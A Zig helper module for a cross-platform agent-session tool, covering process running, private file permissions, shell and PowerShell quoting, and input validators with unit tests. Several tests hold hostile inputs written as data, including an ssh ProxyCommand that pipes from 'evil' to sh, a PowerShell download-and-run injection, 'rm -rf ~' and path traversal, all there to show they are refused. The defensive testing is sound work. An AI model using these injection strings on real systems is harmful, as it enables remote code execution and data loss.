//! Process, path and quoting helpers shared by the session engine. Runs on
//! macOS, Linux and Windows; on Windows tmux lives in MSYS2 and is reached
//! through its login bash, while git and the agents are native.
const std = @import("std");
const builtin = @import("builtin");

pub const Platform = enum { mac, linux, windows };
pub const platform: Platform = switch (builtin.os.tag) {
    .macos => .mac,
    .windows => .windows,
    else => .linux,
};

pub const msys_bash = "C:\\msys64\\usr\\bin\\bash.exe";

pub const Ctx = struct {
    io: std.Io,
    gpa: std.mem.Allocator,
    env: *std.process.Environ.Map,

    pub fn getenv(ctx: Ctx, name: []const u8) ?[]const u8 {
        return ctx.env.get(name);
    }

    pub fn home(ctx: Ctx) []const u8 {
        if (platform == .windows) return ctx.getenv("USERPROFILE") orelse "C:\\Users\\Default";
        return ctx.getenv("HOME") orelse "/";
    }

    pub fn join(ctx: Ctx, parts: []const []const u8) ![]u8 {
        return std.fs.path.join(ctx.gpa, parts);
    }

    pub fn fmt(ctx: Ctx, comptime format: []const u8, args: anytype) ![]u8 {
        return std.fmt.allocPrint(ctx.gpa, format, args);
    }
};

pub const Output = struct {
    ok: bool,
    code: u8,
    stdout: []u8,
    stderr: []u8,

    /// stdout without trailing whitespace (and without \r from Windows tools).
    pub fn text(self: Output) []const u8 {
        return std.mem.trimEnd(u8, self.stdout, " \r\n\t");
    }
};

/// Runs a program and captures its output. A missing program is a failed run,
/// not an error: callers treat "not installed" like "said no".
pub fn run(ctx: Ctx, argv: []const []const u8, cwd: ?[]const u8) Output {
    const result = std.process.run(ctx.gpa, ctx.io, .{
        .argv = argv,
        .cwd = if (cwd) |dir| .{ .path = dir } else .inherit,
        .environ_map = ctx.env,
        .stdout_limit = .limited(16 * 1024 * 1024),
    }) catch return .{ .ok = false, .code = 127, .stdout = &.{}, .stderr = &.{} };
    const code: u8 = switch (result.term) {
        .exited => |c| c,
        else => 1,
    };
    return .{ .ok = code == 0, .code = code, .stdout = result.stdout, .stderr = result.stderr };
}

/// Runs a program on the user's terminal (inherited stdio) and returns its exit code.
var capture_seq = std.atomic.Value(u32).init(0);

/// Like run, with the output going through temporary files instead of pipes.
/// Windows' ssh.exe prints its output and then never exits when stdout is a
/// pipe inside an ssh session (a remote `agb ls` on Windows hung forever).
pub fn runCaptured(ctx: Ctx, argv: []const []const u8) Output {
    if (platform != .windows) return run(ctx, argv, null);
    const failed = Output{ .ok = false, .code = 127, .stdout = &.{}, .stderr = &.{} };
    const stamp = std.Io.Clock.real.now(ctx.io).toNanoseconds();
    const base = ctx.fmt("{s}\\agb-{d}-{d}", .{ ctx.getenv("TEMP") orelse ctx.home(), stamp, capture_seq.fetchAdd(1, .monotonic) }) catch return failed;
    const out_path = ctx.fmt("{s}.out", .{base}) catch return failed;
    const err_path = ctx.fmt("{s}.err", .{base}) catch return failed;
    const cwd = std.Io.Dir.cwd();
    defer cwd.deleteFile(ctx.io, out_path) catch {};
    defer cwd.deleteFile(ctx.io, err_path) catch {};
    const code: u8 = blk: {
        const out = cwd.createFile(ctx.io, out_path, .{}) catch return failed;
        defer out.close(ctx.io);
        const err = cwd.createFile(ctx.io, err_path, .{}) catch return failed;
        defer err.close(ctx.io);
        var child = std.process.spawn(ctx.io, .{ .argv = argv, .environ_map = ctx.env, .stdin = .ignore, .stdout = .{ .file = out }, .stderr = .{ .file = err } }) catch return failed;
        const term = child.wait(ctx.io) catch return failed;
        break :blk switch (term) {
            .exited => |c| c,
            else => 1,
        };
    };
    return .{ .ok = code == 0, .code = code, .stdout = readFile(ctx, out_path) orelse &.{}, .stderr = readFile(ctx, err_path) orelse &.{} };
}

pub fn interactive(ctx: Ctx, argv: []const []const u8, cwd: ?[]const u8) u8 {
    var child = std.process.spawn(ctx.io, .{
        .argv = argv,
        .cwd = if (cwd) |dir| .{ .path = dir } else .inherit,
        .environ_map = ctx.env,
    }) catch return 127;
    const term = child.wait(ctx.io) catch return 1;
    return switch (term) {
        .exited => |c| c,
        else => 1,
    };
}

/// Hands the terminal to another program for good: exec on POSIX; on Windows,
/// which has no exec, it waits and exits with the child's code.
pub fn handOver(ctx: Ctx, argv: []const []const u8) noreturn {
    if (platform != .windows) {
        const err = std.process.replace(ctx.io, .{ .argv = argv, .environ_map = ctx.env });
        std.debug.print("agb: could not run {s}: {s}\n", .{ argv[0], @errorName(err) });
        std.process.exit(127);
    }
    std.process.exit(interactive(ctx, argv, null));
}

/// Finds a program on PATH (and, like a login shell would, in the usual
/// per-user directories that non-interactive ssh sessions leave out).
pub fn which(ctx: Ctx, name: []const u8) ?[]const u8 {
    const exts: []const []const u8 = if (platform == .windows) &.{ ".exe", ".cmd", "" } else &.{""};
    const sep: u8 = if (platform == .windows) ';' else ':';
    var dirs: std.ArrayList([]const u8) = .empty;
    if (ctx.getenv("PATH")) |path| {
        var it = std.mem.splitScalar(u8, path, sep);
        while (it.next()) |dir| if (dir.len > 0) dirs.append(ctx.gpa, dir) catch {};
    }
    const home = ctx.home();
    const extra: []const []const u8 = switch (platform) {
        .mac => &.{ ".local/bin", "/opt/homebrew/bin", "/usr/local/bin" },
        .linux => &.{ ".local/bin", ".local/share/mise/shims", "/usr/local/bin" },
        .windows => &.{ ".local\\bin", "AppData\\Local\\Microsoft\\WinGet\\Links", "C:\\Program Files\\Git\\cmd", "C:\\Program Files\\nodejs", "C:\\Windows\\System32\\OpenSSH" },
    };
    for (extra) |dir| {
        const full = if (std.fs.path.isAbsolute(dir)) dir else (ctx.join(&.{ home, dir }) catch continue);
        dirs.append(ctx.gpa, full) catch {};
    }
    for (dirs.items) |dir| for (exts) |ext| {
        const candidate = ctx.fmt("{s}{c}{s}{s}", .{ dir, std.fs.path.sep, name, ext }) catch continue;
        if (isFile(ctx, candidate)) return candidate;
    };
    return null;
}

pub fn isFile(ctx: Ctx, path: []const u8) bool {
    const stat = std.Io.Dir.cwd().statFile(ctx.io, path, .{}) catch return false;
    return stat.kind == .file or stat.kind == .sym_link;
}

pub fn isDir(ctx: Ctx, path: []const u8) bool {
    const stat = std.Io.Dir.cwd().statFile(ctx.io, path, .{}) catch return false;
    return stat.kind == .directory;
}

pub fn exists(ctx: Ctx, path: []const u8) bool {
    _ = std.Io.Dir.cwd().statFile(ctx.io, path, .{}) catch return false;
    return true;
}

pub fn readFile(ctx: Ctx, path: []const u8) ?[]u8 {
    return std.Io.Dir.cwd().readFileAlloc(ctx.io, path, ctx.gpa, .limited(64 * 1024 * 1024)) catch null;
}

/// Holds an exclusive lock on `path` for as long as the returned file stays
/// open (the process's life): null when another process holds it. One panel
/// host however many times its key is pressed; the lock goes with the process.
pub fn lockInstance(ctx: Ctx, path: []const u8) ?std.Io.File {
    return std.Io.Dir.cwd().createFile(ctx.io, path, .{ .truncate = false, .lock = .exclusive, .lock_nonblocking = true }) catch null;
}

/// What agb writes is private: transcripts, spoken prompts, the Deepgram key,
/// the panel's state. Nothing for the group or for everyone else on the
/// machine (on Windows the per-user profile is protected by its own ACL).
pub const owner_only_file: std.Io.File.Permissions = if (platform == .windows) .default_file else .fromMode(0o600);
pub const owner_only_dir: std.Io.File.Permissions = if (platform == .windows) .default_file else .fromMode(0o700);

/// Writes through a temporary file and a rename, so a crash never leaves a
/// half-written file behind. The rename also repairs the mode of a file an
/// older version left readable by everyone.
pub fn writeFileAtomic(ctx: Ctx, path: []const u8, bytes: []const u8) !void {
    const tmp = try ctx.fmt("{s}.agb.tmp", .{path});
    var file = try std.Io.Dir.cwd().createFile(ctx.io, tmp, .{ .truncate = true, .permissions = owner_only_file });
    try file.writeStreamingAll(ctx.io, bytes);
    file.close(ctx.io);
    try std.Io.Dir.rename(std.Io.Dir.cwd(), tmp, std.Io.Dir.cwd(), path, ctx.io);
}

/// Creates a directory only this user can enter, and refuses one that is not:
/// another local user's symlink, or a directory open to the group or to
/// everyone. What goes there — recordings, transcripts, the panel's command
/// file — is private, and a directory others can write to is a way in.
pub fn createPrivateDir(io: std.Io, path: []const u8) !void {
    _ = try std.Io.Dir.cwd().createDirPathStatus(io, path, owner_only_dir);
    if (platform != .windows) try requirePrivateDir(io, path);
}

fn requirePrivateDir(io: std.Io, path: []const u8) !void {
    const info = try std.Io.Dir.cwd().statFile(io, path, .{ .follow_symlinks = false });
    if (info.kind != .directory or info.permissions.toMode() & 0o077 != 0) return error.DirectoryNotPrivate;
}

// ---------------------------------------------------------------- quoting

/// POSIX shell single-quoting: 'it'\''s'.
pub fn shQuote(ctx: Ctx, value: []const u8) ![]u8 {
    var out: std.ArrayList(u8) = .empty;
    try out.append(ctx.gpa, '\'');
    for (value) |c| {
        if (c == '\'') try out.appendSlice(ctx.gpa, "'\\''") else try out.append(ctx.gpa, c);
    }
    try out.append(ctx.gpa, '\'');
    return out.items;
}

/// The bytes at the start of `value` that PowerShell reads as a single quote:
/// the ASCII one and the typographic family U+2018..U+201B (E2 80 98..9B), each
/// of which closes a single-quoted string. Zero when the next character is not one.
fn psQuoteRun(value: []const u8) usize {
    if (value[0] == '\'') return 1;
    if (value.len >= 3 and value[0] == 0xE2 and value[1] == 0x80 and value[2] >= 0x98 and value[2] <= 0x9B) return 3;
    return 0;
}

/// PowerShell single-quoting: 'it''s'. Windows' sshd hands commands to PowerShell,
/// and its tokenizer ends a single-quoted string on a curly quote as readily as on
/// the ASCII one — dictated Portuguese is full of them — so every character of that
/// family is doubled, not just '.
pub fn psQuote(ctx: Ctx, value: []const u8) ![]u8 {
    var out: std.ArrayList(u8) = .empty;
    try out.append(ctx.gpa, '\'');
    var i: usize = 0;
    while (i < value.len) {
        const quote = psQuoteRun(value[i..]);
        if (quote == 0) {
            try out.append(ctx.gpa, value[i]);
            i += 1;
            continue;
        }
        try out.appendSlice(ctx.gpa, value[i .. i + quote]);
        try out.appendSlice(ctx.gpa, value[i .. i + quote]);
        i += quote;
    }
    try out.append(ctx.gpa, '\'');
    return out.items;
}

pub fn shJoin(ctx: Ctx, argv: []const []const u8) ![]u8 {
    var out: std.ArrayList(u8) = .empty;
    for (argv, 0..) |arg, i| {
        if (i > 0) try out.append(ctx.gpa, ' ');
        try out.appendSlice(ctx.gpa, try shQuote(ctx, arg));
    }
    return out.items;
}

// ---------------------------------------------------------------- paths

/// C:\dev\x or C:/dev/x -> /c/dev/x, the form MSYS2 tmux understands.
pub fn toMsys(ctx: Ctx, path: []const u8) ![]u8 {
    if (path.len >= 2 and path[1] == ':') {
        const rest = try std.mem.replaceOwned(u8, ctx.gpa, path[2..], "\\", "/");
        return ctx.fmt("/{c}{s}", .{ std.ascii.toLower(path[0]), rest });
    }
    return std.mem.replaceOwned(u8, ctx.gpa, path, "\\", "/");
}

/// /c/dev/x -> C:/dev/x (git and Claude Code on Windows).
pub fn fromMsys(ctx: Ctx, path: []const u8) ![]u8 {
    if (path.len >= 3 and path[0] == '/' and std.ascii.isAlphabetic(path[1]) and path[2] == '/')
        return ctx.fmt("{c}:{s}", .{ std.ascii.toUpper(path[1]), path[2..] });
    return ctx.gpa.dupe(u8, path);
}

/// Task names, machine names: a single path component and never a flag. "." and
/// ".." are directory entries, not names — ~/agents/.. is the home directory,
/// and an agent started there runs with every permission skipped over the whole
/// account. A leading "-" would be read as an option by the tool that receives it.
pub fn validSlug(value: []const u8) bool {
    if (value.len == 0 or value.len > 60 or value[0] == '-') return false;
    for (value) |c| if (!(std.ascii.isAlphanumeric(c) or c == '.' or c == '_' or c == '-')) return false;
    return std.mem.indexOfNone(u8, value, ".") != null;
}

/// Repository names or paths; no backslashes (they break through PowerShell),
/// nothing a shell would interpret, no ".." to climb out of the repo roots and
/// no leading "-" for the tool that receives it.
pub fn validRepo(value: []const u8) bool {
    if (value.len == 0 or value[0] == '-') return false;
    for (value) |c| if (!(std.ascii.isAlphanumeric(c) or std.mem.indexOfScalar(u8, "._/:~-", c) != null)) return false;
    var parts = std.mem.splitScalar(u8, value, '/');
    while (parts.next()) |part| if (std.mem.eql(u8, part, "..")) return false;
    return true;
}

/// An ssh destination from the registry. It becomes an argv element of ssh and
/// scp, where a value starting with "-" is an option and not a host
/// (-oProxyCommand=… runs a command on *this* machine), and its user part is
/// interpolated into a Windows path and a PowerShell command on the far side.
/// The registry is rewritten by `agb deploy` from another machine, so it is
/// input, not configuration.
pub fn validSshTarget(value: []const u8) bool {
    if (value.len == 0 or value.len > 253 or value[0] == '-') return false;
    var users: usize = 0;
    for (value) |c| {
        if (c == '@') users += 1 else if (!(std.ascii.isAlphanumeric(c) or c == '.' or c == '_' or c == '-')) return false;
    }
    return users <= 1;
}

/// A tmux session name this machine may be asked to address. tmux splits a
/// target at ":" (session:window.pane), so `=a:b` names session "a": a session
/// whose name holds one cannot be addressed, and aiming somewhere else instead
/// would send keys to — or kill — a different session.
pub fn validTarget(value: []const u8) bool {
    if (value.len == 0 or value.len > 200) return false;
    for (value) |c| if (c == ':' or c == '\n' or c == '\r' or c == 0) return false;
    return true;
}

/// "Fix the login after the update!" -> "fix-the-login-after" (a tmux- and
/// branch-safe task name from the first words of a request).
pub fn slugFromWords(ctx: Ctx, words: []const u8, max_words: usize) ![]u8 {
    var out: std.ArrayList(u8) = .empty;
    var count: usize = 0;
    var it = std.mem.tokenizeAny(u8, words, " \t\n");
    while (it.next()) |word| {
        var clean: std.ArrayList(u8) = .empty;
        for (word) |c| {
            if (std.ascii.isAlphanumeric(c)) try clean.append(ctx.gpa, std.ascii.toLower(c));
        }
        if (clean.items.len == 0) continue;
        if (out.items.len > 0) try out.append(ctx.gpa, '-');
        try out.appendSlice(ctx.gpa, clean.items);
        count += 1;
        if (count == max_words or out.items.len >= 30) break;
    }
    return out.items;
}

test "quoting, paths and slugs" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var env = std.process.Environ.Map.init(arena.allocator());
    const ctx = Ctx{ .io = std.testing.io, .gpa = arena.allocator(), .env = &env };
    try std.testing.expectEqualStrings("'it'\\''s'", try shQuote(ctx, "it's"));
    try std.testing.expectEqualStrings("'it''s'", try psQuote(ctx, "it's"));
    try std.testing.expectEqualStrings("/c/dev/coreum", try toMsys(ctx, "C:\\dev\\coreum"));
    try std.testing.expectEqualStrings("/c/dev/x", try toMsys(ctx, "C:/dev/x"));
    try std.testing.expectEqualStrings("C:/dev/x", try fromMsys(ctx, "/c/dev/x"));
    try std.testing.expectEqualStrings("/home/a", try fromMsys(ctx, "/home/a"));
    try std.testing.expectEqualStrings("fix-the-login-after", try slugFromWords(ctx, "Fix the login, after the update!", 4));
    try std.testing.expectEqualStrings("corrigir-o-login", try slugFromWords(ctx, "corrigir o login", 4));
    try std.testing.expect(validSlug("coreum-xpto_1.2"));
    try std.testing.expect(!validSlug("tem espaço"));
    try std.testing.expect(validRepo("C:/dev/coreum"));
    try std.testing.expect(!validRepo("x; rm -rf ~"));
    try std.testing.expect(!validRepo("C:\\dev"));
}

test "a name is one component, never a flag and never a directory entry" {
    // ~/agents/.. is the home directory: an agent there skips every permission
    // over the whole account, and the home directory is written into Claude's
    // trusted projects.
    try std.testing.expect(!validSlug(".."));
    try std.testing.expect(!validSlug("."));
    try std.testing.expect(!validSlug("..."));
    try std.testing.expect(!validSlug("-d"));
    try std.testing.expect(validSlug("v1.2"));
    try std.testing.expect(!validRepo("../../etc"));
    try std.testing.expect(!validRepo("a/../../b"));
    try std.testing.expect(!validRepo("-oProxyCommand=x"));
    try std.testing.expect(validRepo("~/dev/coreum"));
}

test "an ssh destination cannot be an ssh option" {
    // ssh has no "--": a destination starting with "-" is read as an option, and
    // -oProxyCommand=… runs a command on this machine before any connection.
    try std.testing.expect(!validSshTarget("-oProxyCommand=curl evil|sh"));
    try std.testing.expect(!validSshTarget("-J"));
    try std.testing.expect(!validSshTarget("a'; iex(iwr x); #@host"));
    try std.testing.expect(!validSshTarget("user@host:path"));
    try std.testing.expect(!validSshTarget("a@b@c"));
    try std.testing.expect(!validSshTarget(""));
    try std.testing.expect(validSshTarget("frb@macbook-pro"));
    try std.testing.expect(validSshTarget("Micromed@felipe-windows"));
    try std.testing.expect(validSshTarget("100.64.0.1"));
}

test "a session name that tmux would read as another session is refused" {
    try std.testing.expect(!validTarget("coreum:1"));
    try std.testing.expect(!validTarget("a\nb"));
    try std.testing.expect(!validTarget(""));
    try std.testing.expect(validTarget("coreum-login-bug"));
    try std.testing.expect(validTarget("a.b"));
}

test "PowerShell quoting survives a curly apostrophe" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var env = std.process.Environ.Map.init(arena.allocator());
    const ctx = Ctx{ .io = std.testing.io, .gpa = arena.allocator(), .env = &env };
    // U+2018..U+201B close a single-quoted string in PowerShell exactly as '
    // does, and Deepgram writes the curly one into every dictated contraction.
    try std.testing.expectEqualStrings("'n\u{2019}\u{2019}o'", try psQuote(ctx, "n\u{2019}o"));
    try std.testing.expectEqualStrings("'\u{2018}\u{2018}x\u{201B}\u{201B}'", try psQuote(ctx, "\u{2018}x\u{201B}"));
    try std.testing.expectEqualStrings("'a\u{201A}\u{201A}b'", try psQuote(ctx, "a\u{201A}b"));
    // A quote that does not end a string is left exactly as it was.
    try std.testing.expectEqualStrings("'2\u{2032}'", try psQuote(ctx, "2\u{2032}"));
    try std.testing.expectEqualStrings("'\u{FF07}'", try psQuote(ctx, "\u{FF07}"));
    const injection = try psQuote(ctx, "a\u{2019}; Write-Output PWNED; \u{2019}");
    try std.testing.expectEqualStrings("'a\u{2019}\u{2019}; Write-Output PWNED; \u{2019}\u{2019}'", injection);
}

test "one instance holds the lock" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var env_map = std.process.Environ.Map.init(arena.allocator());
    const ctx = Ctx{ .io = std.testing.io, .gpa = arena.allocator(), .env = &env_map };
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const path = try std.fs.path.join(ctx.gpa, &.{ ".zig-cache", "tmp", &tmp.sub_path, "panel.lock" });
    const first = lockInstance(ctx, path) orelse return error.TestUnexpectedResult;
    try std.testing.expect(lockInstance(ctx, path) == null);
    first.close(ctx.io);
    const again = lockInstance(ctx, path) orelse return error.TestUnexpectedResult;
    again.close(ctx.io);
}

test "what is written is the owner's alone, and a shared directory is refused" {
    if (platform == .windows) return error.SkipZigTest;
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var env_map = std.process.Environ.Map.init(arena.allocator());
    const ctx = Ctx{ .io = std.testing.io, .gpa = arena.allocator(), .env = &env_map };
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const base = try std.fs.path.join(ctx.gpa, &.{ ".zig-cache", "tmp", &tmp.sub_path });

    const secret = try ctx.join(&.{ base, "deepgram.key" });
    try writeFileAtomic(ctx, secret, "a-key");
    const info = try std.Io.Dir.cwd().statFile(ctx.io, secret, .{});
    try std.testing.expectEqual(@as(std.posix.mode_t, 0o600), info.permissions.toMode() & 0o777);

    const private = try ctx.join(&.{ base, "runtime" });
    try createPrivateDir(ctx.io, private);
    try std.testing.expectEqual(@as(std.posix.mode_t, 0o700), (try std.Io.Dir.cwd().statFile(ctx.io, private, .{})).permissions.toMode() & 0o777);

    // A directory another local user could write to is never used.
    var shared = try std.Io.Dir.cwd().openDir(ctx.io, private, .{});
    defer shared.close(ctx.io);
    try shared.setPermissions(ctx.io, .fromMode(0o777));
    try std.testing.expectError(error.DirectoryNotPrivate, createPrivateDir(ctx.io, private));
}
